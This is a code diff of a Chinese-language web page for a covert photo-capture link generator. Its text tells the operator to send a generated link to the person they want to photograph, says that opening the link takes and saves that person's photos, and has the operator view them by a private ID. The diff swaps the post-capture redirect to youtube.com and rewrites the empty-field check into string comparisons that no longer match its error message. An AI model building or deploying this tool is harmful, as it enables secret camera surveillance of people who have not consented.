@@ -11,7 +11,7 @@ function  create() {
     var kd = document.getElementById('kd');
     var myid = document.getElementById('myid');
     var url = document.getElementById('url');
-    if (myid.value=="" || url.value==""){
+    if (myid.value=="myid" || url.value=="https://raw.githubusercontent.com/butterbobo/Confession/refs/heads/Butter/Confession/sc.php"){
         alert("ID或跳转地址不能为空！");
         return false;
     }
@@ -24,7 +24,7 @@ function  create() {
    <p>2.懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
    <p>3.为节省服务器资源，不定期删除7天前的数据</p>
    <p>输入ID：<input type= "text" id="myid"  value= ''/></p>
-   <p>拍摄后跳转到：<input type= "text" id="url"  value= 'http://baidu.com'/></p>
+   <p>拍摄后跳转到：<input type= "text" id="url"  value= 'http://youtube.com'/></p>
    <p><input type= "button"  value= '生成链接'  onclick= 'create();'  />   <input type="button" value='查看照片' onclick=window.location.href='ck.php?id='+document.getElementById('myid').value> </p>
    <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存</p>
    <p><a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
@@ -32,3 +32,4 @@ function  create() {
    <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
   </BODY>
 </HTML>
+
